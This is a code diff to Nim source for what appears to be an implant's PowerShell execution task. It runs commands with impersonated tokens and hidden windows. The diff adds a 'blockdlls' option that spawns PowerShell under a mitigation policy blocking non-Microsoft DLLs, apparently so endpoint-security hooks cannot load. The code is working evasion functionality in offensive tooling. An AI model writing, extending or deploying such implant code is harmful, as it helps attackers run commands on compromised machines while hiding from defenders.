@@ -1,12 +1,39 @@
 import json, os, strutils
 import ../utils/strenc
 import ../utils/debug
+import ../global_data
 
 when defined(windows):
   import winim/lean
   import token_manager
-  import ../global_data
   import ../utils/patches
+  
+  const
+    EXTENDED_STARTUPINFO_PRESENT_PS = 0x00080000'u32
+    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_PS = 0x00020007
+    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_PS = 0x100000000000'u64
+  
+  type
+    PROC_THREAD_ATTRIBUTE_LIST_PS = object
+    LPPROC_THREAD_ATTRIBUTE_LIST_PS = ptr PROC_THREAD_ATTRIBUTE_LIST_PS
+    
+    STARTUPINFOEXA_PS = object
+      StartupInfo: STARTUPINFOA
+      lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_PS
+  
+  proc InitializeProcThreadAttributeListPS(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_PS, 
+                                           dwAttributeCount: DWORD, dwFlags: DWORD, 
+                                           lpSize: ptr SIZE_T): WINBOOL
+    {.importc: "InitializeProcThreadAttributeList", dynlib: "kernel32.dll", stdcall.}
+  
+  proc UpdateProcThreadAttributePS(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_PS,
+                                   dwFlags: DWORD, Attribute: DWORD_PTR, 
+                                   lpValue: PVOID, cbSize: SIZE_T,
+                                   lpPreviousValue: PVOID, lpReturnSize: ptr SIZE_T): WINBOOL
+    {.importc: "UpdateProcThreadAttribute", dynlib: "kernel32.dll", stdcall.}
+  
+  proc DeleteProcThreadAttributeListPS(lpAttributeList: LPPROC_THREAD_ATTRIBUTE_LIST_PS): void
+    {.importc: "DeleteProcThreadAttributeList", dynlib: "kernel32.dll", stdcall.}
 
 type
   PowershellArgs = object
@@ -232,9 +259,12 @@ proc powershell*(taskId: string, params: JsonNode): JsonNode =
 
       # Check if we have an impersonation token
       let tokenHandle = getTokenHandle()
+      let blockDlls = getBlockDlls()
       var createResult: WINBOOL
 
       if tokenHandle != 0:
+        # CreateProcessWithTokenW does not support STARTUPINFOEX,
+        # so blockdlls cannot be applied with impersonated tokens
         var commandLineW = newWideCString(commandLine)
 
         var siW: STARTUPINFOW
@@ -259,17 +289,71 @@ proc powershell*(taskId: string, params: JsonNode): JsonNode =
 
         # If it fails with ACCESS_DENIED (error 5), fall back to CreateProcessA
         if createResult == 0 and GetLastError() == 5:
+          if blockDlls:
+            var mitigationPolicy: uint64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_PS
+            var size: SIZE_T = 0
+            discard InitializeProcThreadAttributeListPS(nil, 1, 0, addr size)
+            var attrList = newSeq[byte](size)
+            let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST_PS](addr attrList[0])
+            
+            if InitializeProcThreadAttributeListPS(attrListPtr, 1, 0, addr size) != 0:
+              discard UpdateProcThreadAttributePS(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_PS,
+                                                   addr mitigationPolicy, SIZE_T(sizeof(uint64)), nil, nil)
+              var siEx: STARTUPINFOEXA_PS
+              siEx.StartupInfo = si
+              siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA_PS).DWORD
+              siEx.lpAttributeList = attrListPtr
+              
+              createResult = CreateProcessA(
+                nil, addr commandLine[0], nil, nil,
+                TRUE, CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT_PS,
+                nil, nil, cast[ptr STARTUPINFOA](addr siEx), addr pi
+              )
+              DeleteProcThreadAttributeListPS(attrListPtr)
+            else:
+              createResult = CreateProcessA(
+                nil, addr commandLine[0], nil, nil,
+                TRUE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi
+              )
+          else:
+            createResult = CreateProcessA(
+              nil,
+              addr commandLine[0],
+              nil,
+              nil,
+              TRUE,
+              CREATE_NO_WINDOW,
+              nil,
+              nil,
+              addr si,
+              addr pi
+            )
+      elif blockDlls:
+        # No token, but blockdlls enabled
+        var mitigationPolicy: uint64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON_PS
+        var size: SIZE_T = 0
+        discard InitializeProcThreadAttributeListPS(nil, 1, 0, addr size)
+        var attrList = newSeq[byte](size)
+        let attrListPtr = cast[LPPROC_THREAD_ATTRIBUTE_LIST_PS](addr attrList[0])
+        
+        if InitializeProcThreadAttributeListPS(attrListPtr, 1, 0, addr size) != 0:
+          discard UpdateProcThreadAttributePS(attrListPtr, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY_PS,
+                                               addr mitigationPolicy, SIZE_T(sizeof(uint64)), nil, nil)
+          var siEx: STARTUPINFOEXA_PS
+          siEx.StartupInfo = si
+          siEx.StartupInfo.cb = sizeof(STARTUPINFOEXA_PS).DWORD
+          siEx.lpAttributeList = attrListPtr
+          
           createResult = CreateProcessA(
-            nil,
-            addr commandLine[0],
-            nil,
-            nil,
-            TRUE,
-            CREATE_NO_WINDOW,
-            nil,
-            nil,
-            addr si,
-            addr pi
+            nil, addr commandLine[0], nil, nil,
+            TRUE, CREATE_NO_WINDOW or EXTENDED_STARTUPINFO_PRESENT_PS,
+            nil, nil, cast[ptr STARTUPINFOA](addr siEx), addr pi
+          )
+          DeleteProcThreadAttributeListPS(attrListPtr)
+        else:
+          createResult = CreateProcessA(
+            nil, addr commandLine[0], nil, nil,
+            TRUE, CREATE_NO_WINDOW, nil, nil, addr si, addr pi
           )
       else:
         createResult = CreateProcessA(
